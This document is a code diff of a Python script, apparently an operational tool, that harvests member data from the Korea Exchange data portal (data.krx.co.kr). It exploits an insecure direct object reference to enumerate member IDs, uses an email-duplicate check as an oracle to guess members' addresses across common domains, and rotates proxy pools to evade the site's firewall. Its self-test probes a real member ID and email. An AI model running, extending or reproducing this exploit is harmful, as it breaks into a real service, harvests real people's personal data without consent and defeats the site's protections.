@@ -1,11 +1,13 @@
 #!/usr/bin/env python3
 """data.krx.co.kr member email dump: IDOR mbrNo -> MBR_ID -> isDupMbrEmail.
 
-Never treat WAF/HTML/redirect as empty. Keep working proxies. Retry until
-real JSON. Re-check ids that have no email yet with extra domains.
+WAF/HTML/redirect is never an empty member. 407 proxies are dropped on the
+first failure. Working proxies are kept. Direct IP is never used when a
+panda extract URL is configured.
 """
 from __future__ import annotations
 
+import argparse
 import csv
 import json
 import os
@@ -21,7 +23,6 @@ import requests
 BASE = "https://data.krx.co.kr"
 IDOR = BASE + "/comm/bldAttendant/getJsonData.cmd"
 DUP = BASE + "/contents/MDC/COMS/client/isDupMbrEmail.cmd"
-# High-hit first, then extra Korean/global domains for leftover ids.
 DOMS_PRIMARY = ["naver.com", "gmail.com", "hanmail.net", "daum.net", "kakao.com", "krx.co.kr"]
 DOMS_EXTRA = [
     "nate.com",
@@ -44,16 +45,20 @@ UA = (
     "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
 )
 START = int(os.environ.get("KRX_START", "2000005000"))
-END = int(os.environ.get("KRX_END", "2000222667"))
-WORKERS = int(os.environ.get("KRX_WORKERS", "12"))
+END = int(os.environ.get("KRX_END", "2000223000"))
+WORKERS = int(os.environ.get("KRX_WORKERS", "10"))
 OUTDIR = os.environ.get("KRX_OUT", "/data/recon/data.krx.co.kr/dump")
 STATIC_PROXY = (os.environ.get("HTTPS_PROXY") or os.environ.get("HTTP_PROXY") or "").rstrip("/")
 PROXY_AUTH = os.environ.get("KRX_PROXY_AUTH", "").strip()
-CLOUD_GOOD_FROM = 2000005966  # before this, cloud dump had not really started
+CLOUD_GOOD_FROM = 2000005966
+KNOWN_MBR = 2000008331
+KNOWN_ID = "ryujt"
+EMPTY_MBR = 1999999999
 
 _tls = threading.local()
 _lock = threading.Lock()
 _stats = {"done": 0, "ids": 0, "emails": 0, "err": 0, "retry": 0, "t0": time.time()}
+POOL: "ProxyPool | None" = None
 
 
 def panda_urls() -> list[str]:
@@ -69,118 +74,97 @@ def panda_urls() -> list[str]:
         part = part.strip()
         if part:
             urls.append(part)
-    return urls
+    # de-dupe preserve order
+    out: list[str] = []
+    for u in urls:
+        if u not in out:
+            out.append(u)
+    return out
 
 
-def inject_auth(proxy: str) -> str:
-    if not PROXY_AUTH or "@" in proxy.split("://", 1)[-1]:
+def inject_auth(proxy: str, extra_auth: str = "") -> str:
+    auth = extra_auth or PROXY_AUTH
+    if not auth:
         return proxy
     p = urlparse(proxy)
-    host = p.netloc
-    return urlunparse((p.scheme or "http", f"{PROXY_AUTH}@{host}", p.path, "", p.query, ""))
+    host = p.hostname or ""
+    port = f":{p.port}" if p.port else ""
+    if p.username:
+        return proxy
+    return urlunparse((p.scheme or "http", f"{auth}@{host}{port}", p.path, "", p.query, ""))
 
 
-class ProxyPool:
-    def __init__(self) -> None:
-        self.urls = panda_urls()
-        self.proxies: list[str] = []
-        self.good: list[str] = []
-        self.bad: set[str] = set()
-        self.strikes: dict[str, int] = {}
-        self.last_fetch = 0.0
-        self.ui = 0
-        self.i = 0
-        if STATIC_PROXY and not self.urls:
-            self.proxies = [STATIC_PROXY]
-
-    def _normalize(self, line: str) -> str | None:
-        line = line.strip()
-        if not line or line.startswith("{"):
+def parse_proxy_line(line: str, extra_auth: str = "") -> str | None:
+    line = (line or "").replace("\r", "").strip()
+    if not line or line.startswith("{") or line.startswith("<"):
+        return None
+    low = line.lower()
+    if "code" in low and ("invalid" in low or "请按规定" in line or "error" in low):
+        return None
+    if "://" in line:
+        return inject_auth(line, extra_auth)
+    if "@" in line and line.count(":") >= 2:
+        return inject_auth("http://" + line, extra_auth)
+    parts = line.split(":")
+    if len(parts) == 2:
+        ip, port = parts
+        if not port.isdigit():
             return None
-        if "://" not in line:
-            line = "http://" + line
-        return inject_auth(line)
+        return inject_auth(f"http://{ip}:{port}", extra_auth)
+    if len(parts) >= 4:
+        ip, port, user, pwd = parts[0], parts[1], parts[2], ":".join(parts[3:])
+        if not port.isdigit():
+            return None
+        return f"http://{user}:{pwd}@{ip}:{port}"
+    return None
 
-    def fetch(self) -> None:
-        if not self.urls:
-            return
-        now = time.time()
-        wait = 1.3 - (now - self.last_fetch)
-        if wait > 0:
-            time.sleep(wait)
-        url = self.urls[self.ui % len(self.urls)]
-        self.ui += 1
+
+def parse_extract_body(text: str, extra_auth: str = "") -> list[str]:
+    text = (text or "").strip()
+    if not text:
+        return []
+    if text.startswith("{"):
         try:
-            r = requests.get(url, timeout=15)
-            self.last_fetch = time.time()
-            got = [x for x in (self._normalize(t) for t in r.text.splitlines()) if x]
+            j = json.loads(text)
         except Exception:
-            self.last_fetch = time.time()
-            got = []
-        if not got:
-            return
-        with _lock:
-            for p in got:
-                if p not in self.proxies:
-                    self.proxies.append(p)
-                self.bad.discard(p)
-                self.strikes.pop(p, None)
-            if len(self.proxies) > 24:
-                keep = set(self.good) | set(got)
-                self.proxies = [p for p in self.proxies if p in keep][-24:]
-        print(f"proxy_pool +{len(got)} live={self.live_n()} good={len(self.good)}", flush=True)
-
-    def live_n(self) -> int:
-        return len([p for p in self.proxies if p not in self.bad])
-
-    def pick(self) -> str | None:
-        with _lock:
-            prefer = [p for p in self.good if p not in self.bad]
-            live = prefer or [p for p in self.proxies if p not in self.bad]
-        if not live:
-            self.fetch()
-            with _lock:
-                live = [p for p in self.good + self.proxies if p not in self.bad]
-                if not live:
-                    live = list(self.proxies) or ([STATIC_PROXY] if STATIC_PROXY else [])
-        if not live:
-            return STATIC_PROXY or None
-        with _lock:
-            self.i += 1
-            return live[self.i % len(live)]
-
-    def ok(self, proxy: str | None) -> None:
-        if not proxy:
-            return
-        with _lock:
-            self.strikes.pop(proxy, None)
-            self.bad.discard(proxy)
-            if proxy not in self.good:
-                self.good.append(proxy)
-
-    def fail(self, proxy: str | None) -> None:
-        if not proxy:
-            return
-        with _lock:
-            _stats["retry"] += 1
-            n = self.strikes.get(proxy, 0) + 1
-            self.strikes[proxy] = n
-            if n >= 2:
-                self.bad.add(proxy)
-                if proxy in self.good:
-                    self.good.remove(proxy)
-            live = len([p for p in self.proxies if p not in self.bad])
-        if live < 3:
-            self.fetch()
+            return []
+        items = j.get("obj") or j.get("data") or []
+        out: list[str] = []
+        if isinstance(items, list):
+            for item in items:
+                if not isinstance(item, dict):
+                    continue
+                ip = str(item.get("ip") or "").strip()
+                port = str(item.get("port") or "").strip()
+                if not ip or not port:
+                    continue
+                user = str(
+                    item.get("account")
+                    or item.get("user")
+                    or item.get("username")
+                    or item.get("acc")
+                    or ""
+                ).strip()
+                pwd = str(item.get("password") or item.get("pwd") or item.get("pass") or "").strip()
+                if user and pwd:
+                    out.append(f"http://{user}:{pwd}@{ip}:{port}")
+                else:
+                    p = parse_proxy_line(f"{ip}:{port}", extra_auth)
+                    if p:
+                        out.append(p)
+        return out
+    got: list[str] = []
+    for line in text.splitlines():
+        p = parse_proxy_line(line, extra_auth)
+        if p:
+            got.append(p)
+    return got
 
 
-POOL = ProxyPool()
-
-
-def is_waf(resp: requests.Response) -> bool:
-    if resp.status_code != 200:
+def is_waf_text(status: int, text: str) -> bool:
+    if status != 200:
         return True
-    head = resp.text[:800]
+    head = (text or "")[:800]
     if head.lstrip().startswith("<"):
         return True
     return any(
@@ -194,14 +178,128 @@ def is_waf(resp: requests.Response) -> bool:
     )
 
 
-def json_body(resp: requests.Response) -> dict[str, Any] | None:
-    if is_waf(resp):
+def is_proxy_auth_fail(exc: BaseException | None = None, text: str = "") -> bool:
+    blob = f"{exc} {text}".lower()
+    return "407" in blob or "white list" in blob or "not authorized" in blob
+
+
+def json_from_response(resp: requests.Response) -> dict[str, Any] | None:
+    if is_waf_text(resp.status_code, resp.text):
         return None
     try:
         data = resp.json()
     except Exception:
         return None
     return data if isinstance(data, dict) else None
+
+
+class ProxyPool:
+    def __init__(self, urls: list[str] | None = None, static: str = "", extra_auth: str = "") -> None:
+        self.urls = urls if urls is not None else panda_urls()
+        self.static = static.rstrip("/") if static else STATIC_PROXY
+        self.extra_auth = extra_auth or PROXY_AUTH
+        self.proxies: list[str] = []
+        self.good: list[str] = []
+        self.bad: set[str] = set()
+        self.strikes: dict[str, int] = {}
+        self.last_fetch = 0.0
+        self.ui = 0
+        self.i = 0
+        self._fetch_lock = threading.Lock()
+        self.allow_direct = not self.urls
+        if self.static and not self.urls:
+            self.proxies = [self.static]
+
+    def live_n(self) -> int:
+        return len([p for p in self.proxies if p not in self.bad])
+
+    def fetch(self) -> None:
+        if not self.urls:
+            return
+        if not self._fetch_lock.acquire(blocking=False):
+            time.sleep(0.2)
+            return
+        try:
+            wait = 1.3 - (time.time() - self.last_fetch)
+            if wait > 0:
+                time.sleep(wait)
+            url = self.urls[self.ui % len(self.urls)]
+            self.ui += 1
+            try:
+                r = requests.get(url, timeout=15)
+                self.last_fetch = time.time()
+                got = parse_extract_body(r.text, self.extra_auth)
+            except Exception:
+                self.last_fetch = time.time()
+                got = []
+            if not got:
+                return
+            with _lock:
+                for p in got:
+                    if p not in self.proxies:
+                        self.proxies.append(p)
+                    self.bad.discard(p)
+                    self.strikes.pop(p, None)
+                if len(self.proxies) > 30:
+                    keep = set(self.good) | set(got)
+                    self.proxies = [p for p in self.proxies if p in keep][-30:]
+            print(f"proxy_pool +{len(got)} live={self.live_n()} good={len(self.good)}", flush=True)
+        finally:
+            self._fetch_lock.release()
+
+    def fetch_all(self) -> None:
+        for _ in list(self.urls):
+            self.fetch()
+
+    def pick(self) -> str | None:
+        for _ in range(12):
+            with _lock:
+                prefer = [p for p in self.good if p not in self.bad]
+                live = prefer or [p for p in self.proxies if p not in self.bad]
+            if live:
+                with _lock:
+                    self.i += 1
+                    return live[self.i % len(live)]
+            self.fetch()
+        if self.allow_direct:
+            return self.static or None
+        self.fetch()
+        with _lock:
+            live = [p for p in self.good + self.proxies if p not in self.bad]
+            if live:
+                self.i += 1
+                return live[self.i % len(live)]
+        return None
+
+    def ok(self, proxy: str | None) -> None:
+        if not proxy:
+            return
+        with _lock:
+            self.strikes.pop(proxy, None)
+            self.bad.discard(proxy)
+            if proxy not in self.good:
+                self.good.append(proxy)
+
+    def fail(self, proxy: str | None, auth: bool = False) -> None:
+        if not proxy:
+            return
+        with _lock:
+            _stats["retry"] += 1
+            if auth:
+                self.strikes[proxy] = 99
+                self.bad.add(proxy)
+                if proxy in self.good:
+                    self.good.remove(proxy)
+            else:
+                n = self.strikes.get(proxy, 0) + 1
+                self.strikes[proxy] = n
+                if n >= 2:
+                    self.bad.add(proxy)
+                    if proxy in self.good:
+                        self.good.remove(proxy)
+            live = len([p for p in self.proxies if p not in self.bad])
+        if live < 3:
+            self.fetch()
 
 
 def session_for(proxy: str | None) -> requests.Session:
@@ -211,31 +309,37 @@ def session_for(proxy: str | None) -> requests.Session:
     s = cache.get(key)
     if s is None:
         s = requests.Session()
+        s.trust_env = False
         s.headers.update({"User-Agent": UA, "X-Requested-With": "XMLHttpRequest"})
         s.mount("https://", requests.adapters.HTTPAdapter(pool_connections=4, pool_maxsize=4, max_retries=0))
         if proxy:
             s.proxies.update({"http": proxy, "https": proxy})
-        try:
-            s.get(BASE + "/contents/MDC/MAIN/main/index.cmd", timeout=12)
-        except Exception:
-            pass
         cache[key] = s
-        if len(cache) > 10:
-            cache.pop(next(iter(cache)))
+        if len(cache) > 12:
+            old = next(iter(cache))
+            if old != key:
+                cache.pop(old, None)
     return s
 
 
 def drop_session(proxy: str | None) -> None:
     cache = getattr(_tls, "cache", None)
-    if not cache:
-        return
-    cache.pop(proxy or "direct", None)
+    if cache:
+        cache.pop(proxy or "direct", None)
 
 
 def post_ok(url: str, data: dict[str, str], need: str) -> dict[str, Any]:
+    pool = POOL
+    if pool is None:
+        raise RuntimeError("proxy pool not initialized")
     fails = 0
     while True:
-        proxy = POOL.pick()
+        proxy = pool.pick()
+        if proxy is None and not pool.allow_direct:
+            time.sleep(1.0)
+            pool.fetch()
+            fails += 1
+            continue
         s = session_for(proxy)
         try:
             r = s.post(
@@ -244,17 +348,27 @@ def post_ok(url: str, data: dict[str, str], need: str) -> dict[str, Any]:
                 headers={"Referer": BASE + "/contents/MDC/MAIN/main/index.cmd"},
                 timeout=15,
             )
-            body = json_body(r)
+            if is_proxy_auth_fail(text=r.text):
+                drop_session(proxy)
+                pool.fail(proxy, auth=True)
+                fails += 1
+                continue
+            body = json_from_response(r)
             if body is not None and need in body:
-                POOL.ok(proxy)
+                pool.ok(proxy)
                 return body
-        except Exception:
-            pass
+        except Exception as e:
+            drop_session(proxy)
+            pool.fail(proxy, auth=is_proxy_auth_fail(e))
+            fails += 1
+            if fails % 4 == 0:
+                time.sleep(min(0.25 * (fails // 4), 2.0) + random.random() * 0.2)
+            continue
         drop_session(proxy)
-        POOL.fail(proxy)
+        pool.fail(proxy)
         fails += 1
         if fails % 4 == 0:
-            time.sleep(min(0.25 * (fails // 4), 2.5) + random.random() * 0.2)
+            time.sleep(min(0.25 * (fails // 4), 2.0) + random.random() * 0.2)
 
 
 def mbr_id(mno: int) -> str | None:
@@ -317,20 +431,151 @@ def load_csv_map(path: str) -> dict[int, str]:
     return out
 
 
-def load_empty(path: str) -> set[int]:
-    seen: set[int] = set()
+def load_scanned_status(path: str) -> dict[int, str]:
+    out: dict[int, str] = {}
     if not os.path.exists(path):
-        return seen
+        return out
     with open(path, newline="", encoding="utf-8") as f:
         for row in csv.reader(f):
             if not row or row[0] in {"mbrNo"}:
                 continue
-            if len(row) > 1 and row[1] == "empty":
-                try:
-                    seen.add(int(row[0]))
-                except ValueError:
-                    continue
-    return seen
+            try:
+                out[int(row[0])] = row[1] if len(row) > 1 else ""
+            except ValueError:
+                continue
+    return out
+
+
+def build_jobs(
+    start: int,
+    end: int,
+    have_id: dict[int, str],
+    have_email: dict[int, str],
+    scanned: dict[int, str],
+    cloud_good_from: int = CLOUD_GOOD_FROM,
+) -> tuple[list[tuple[int, str]], list[int], list[int], list[int]]:
+    confirmed_empty = {n for n, st in scanned.items() if st == "empty"}
+    nomail = {n for n, st in scanned.items() if st == "nomail"}
+    seen_skip = set(have_id) | confirmed_empty
+    last_id = max(have_id) if have_id else start
+    head = [n for n in range(start, min(end, cloud_good_from - 1) + 1) if n not in seen_skip]
+    tail_from = max(start, last_id + 1)
+    tail = [n for n in range(tail_from, end + 1) if n not in seen_skip]
+    holes = [
+        n
+        for n in range(max(start, cloud_good_from), min(end, last_id) + 1)
+        if n not in seen_skip
+    ]
+    mail_jobs = [
+        (n, mid)
+        for n, mid in have_id.items()
+        if n not in have_email and n not in nomail and mid
+    ]
+    return mail_jobs, head, tail, holes
+
+
+def init_pool(urls: list[str] | None = None) -> ProxyPool:
+    global POOL
+    POOL = ProxyPool(urls=urls)
+    return POOL
+
+
+def selftest() -> int:
+    """Live checks against panda + KRX. Return 0 if safe to dump."""
+    urls = panda_urls()
+    print("selftest urls", len(urls), flush=True)
+    if not urls:
+        print("FAIL no panda urls", flush=True)
+        return 1
+    pool = init_pool(urls)
+    pool.fetch_all()
+    if pool.live_n() < 1:
+        print("FAIL extract empty", flush=True)
+        return 1
+    parsed = parse_extract_body("1.2.3.4:80\r\n5.6.7.8:90\r\n")
+    if parsed != ["http://1.2.3.4:80", "http://5.6.7.8:90"]:
+        print("FAIL crlf parse", parsed, flush=True)
+        return 1
+
+    last_hit = None
+    functional_ok = False
+    for proxy in list(pool.proxies):
+        s = requests.Session()
+        s.trust_env = False
+        s.proxies = {"http": proxy, "https": proxy}
+        s.headers.update({"User-Agent": UA, "X-Requested-With": "XMLHttpRequest"})
+
+        def post_now(mno: int):
+            r = s.post(
+                IDOR,
+                data={"bld": "dbms/MDC/DATA/mbr_add_info_select", "locale": "ko_KR", "mbrNo": str(mno)},
+                headers={"Referer": BASE + "/contents/MDC/MAIN/main/index.cmd"},
+                timeout=16,
+            )
+            body = json_from_response(r)
+            if body is None or "block1" not in body:
+                raise RuntimeError(f"bad json {r.status_code} {r.text[:120]}")
+            block = body.get("block1") or []
+            return None if not block else block[0].get("MBR_ID")
+
+        try:
+            mid = post_now(KNOWN_MBR)
+        except Exception as e:
+            pool.fail(proxy, auth=is_proxy_auth_fail(e))
+            print("probe_exc", proxy, type(e).__name__, str(e)[:100], flush=True)
+            continue
+        if mid != KNOWN_ID:
+            pool.fail(proxy, auth=True)
+            print("probe_bad", proxy, mid, flush=True)
+            continue
+        pool.ok(proxy)
+        print("probe_ok", proxy, flush=True)
+        try:
+            empty = post_now(EMPTY_MBR)
+            if empty is not None:
+                print("FAIL empty mbr should be None", empty, flush=True)
+                return 1
+            for n in (2000222668, 2000222700, 2000222800, 2000223000, 2000224000):
+                midn = post_now(n)
+                print("tail", n, midn, flush=True)
+                if midn:
+                    last_hit = (n, midn)
+            r_true = s.post(
+                DUP,
+                data={"email": "ryujt@naver.com"},
+                headers={"Referer": BASE + "/contents/MDC/MAIN/main/index.cmd"},
+                timeout=16,
+            )
+            r_false = s.post(
+                DUP,
+                data={"email": "zzznomatchkrx999@naver.com"},
+                headers={"Referer": BASE + "/contents/MDC/MAIN/main/index.cmd"},
+                timeout=16,
+            )
+            bt = json_from_response(r_true) or {}
+            bf = json_from_response(r_false) or {}
+            tval = str(bt.get("isDupMbrEmail")).lower() == "true"
+            fval = str(bf.get("isDupMbrEmail")).lower() == "true"
+            print("dup", "ryujt@naver.com", tval, "nomatch", fval, flush=True)
+            if "isDupMbrEmail" not in bt or "isDupMbrEmail" not in bf:
+                print("FAIL dup json", bt, bf, flush=True)
+                return 1
+            if fval:
+                print("FAIL collision oracle always true", flush=True)
+                return 1
+            functional_ok = True
+            break
+        except Exception as e:
+            print("probe_died_after_ok", proxy, type(e).__name__, str(e)[:100], flush=True)
+            pool.fail(proxy, auth=is_proxy_auth_fail(e))
+            continue
+
+    print(f"probe good={len(pool.good)}", flush=True)
+    if not functional_ok:
+        print("FAIL no working proxy stayed alive for IDOR+dup", flush=True)
+        return 1
+    print("SELFTEST_OK good_proxies", len(pool.good), "tail", last_hit, flush=True)
+    return 0
 
 
 def main() -> None:
@@ -342,7 +587,7 @@ def main() -> None:
 
     have_id = load_csv_map(id_path)
     have_email = load_csv_map(email_path)
-    confirmed_empty = load_empty(scanned_path)
+    scanned = load_scanned_status(scanned_path)
 
     email_new = not os.path.exists(email_path)
     id_new = not os.path.exists(id_path)
@@ -358,30 +603,17 @@ def main() -> None:
     if scan_new:
         sw.writerow(["mbrNo", "status", "mbrId"])
 
-    if POOL.urls:
-        POOL.fetch()
+    pool = init_pool()
+    if pool.urls:
+        pool.fetch_all()
 
-    # Mail leftovers first (id exists, no email yet) — extra domains only.
-    mail_jobs = [(n, mid) for n, mid in have_id.items() if n not in have_email and mid]
-    # IDOR order: never-scanned head, then tail after last real id, then holes.
-    idor_jobs: list[int] = []
-    seen_skip = set(have_id) | confirmed_empty
-    last_id = max(have_id) if have_id else START
-    head = [n for n in range(START, min(END, CLOUD_GOOD_FROM - 1) + 1) if n not in seen_skip]
-    tail_from = max(START, last_id + 1)
-    tail = [n for n in range(tail_from, END + 1) if n not in seen_skip]
-    holes = [
-        n
-        for n in range(max(START, CLOUD_GOOD_FROM), min(END, last_id) + 1)
-        if n not in seen_skip
-    ]
+    mail_jobs, head, tail, holes = build_jobs(START, END, have_id, have_email, scanned)
     idor_jobs = head + tail + holes
-
     total = len(mail_jobs) + len(idor_jobs)
     print(
         f"workers={WORKERS} mail_left={len(mail_jobs)} idor={len(idor_jobs)} "
         f"head={len(head)} tail={len(tail)} holes={len(holes)} "
-        f"have_id={len(have_id)} have_email={len(have_email)} panda={len(POOL.urls)}",
+        f"have_id={len(have_id)} have_email={len(have_email)} panda={len(pool.urls)}",
         flush=True,
     )
     last_flush = time.time()
@@ -398,15 +630,17 @@ def main() -> None:
                     _stats["ids"] += 1
                     wrote_id.add(mno)
                     iw.writerow([mno, mid])
+            elif kind == "mail" and not em:
+                sw.writerow([mno, "nomail", mid or ""])
             if em and mno not in wrote_em:
                 _stats["emails"] += 1
                 wrote_em.add(mno)
                 ew.writerow([mno, mid, em])
+            ef.flush()
+            idf.flush()
+            sf.flush()
             done = _stats["done"]
             if time.time() - last_flush > 5:
-                ef.flush()
-                idf.flush()
-                sf.flush()
                 elapsed = max(time.time() - _stats["t0"], 0.001)
                 rate = done / elapsed
                 remain = max(total - done, 0)
@@ -419,7 +653,7 @@ def main() -> None:
                         "emails": _stats["emails"],
                         "err": _stats["err"],
                         "retry": _stats["retry"],
-                        "good_proxies": len(POOL.good),
+                        "good_proxies": len(pool.good),
                         "rate_per_s": round(rate, 2),
                         "eta_min": round(eta / 60, 1),
                         "last": mno,
@@ -428,7 +662,7 @@ def main() -> None:
                 )
                 print(
                     f"done={done}/{total} ids+={_stats['ids']} emails+={_stats['emails']} "
-                    f"retry={_stats['retry']} good={len(POOL.good)} "
+                    f"retry={_stats['retry']} good={len(pool.good)} "
                     f"{rate:.1f}/s eta={eta/60:.1f}min last={mno}",
                     flush=True,
                 )
@@ -438,7 +672,8 @@ def main() -> None:
         for fut in as_completed(futs):
             mno, mid, em = fut.result()
             handle(mno, mid, em, kind)
-    chunk = 300
+
+    chunk = 80
     with ThreadPoolExecutor(max_workers=WORKERS) as ex:
         i = 0
         while i < len(mail_jobs):
@@ -451,9 +686,6 @@ def main() -> None:
             run_batch([ex.submit(one_idor, n) for n in batch], "idor")
             i += chunk
 
-    ef.flush()
-    idf.flush()
-    sf.flush()
     ef.close()
     idf.close()
     sf.close()
@@ -461,4 +693,9 @@ def main() -> None:
 
 
 if __name__ == "__main__":
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--selftest", action="store_true")
+    args = ap.parse_args()
+    if args.selftest:
+        raise SystemExit(selftest())
     main()
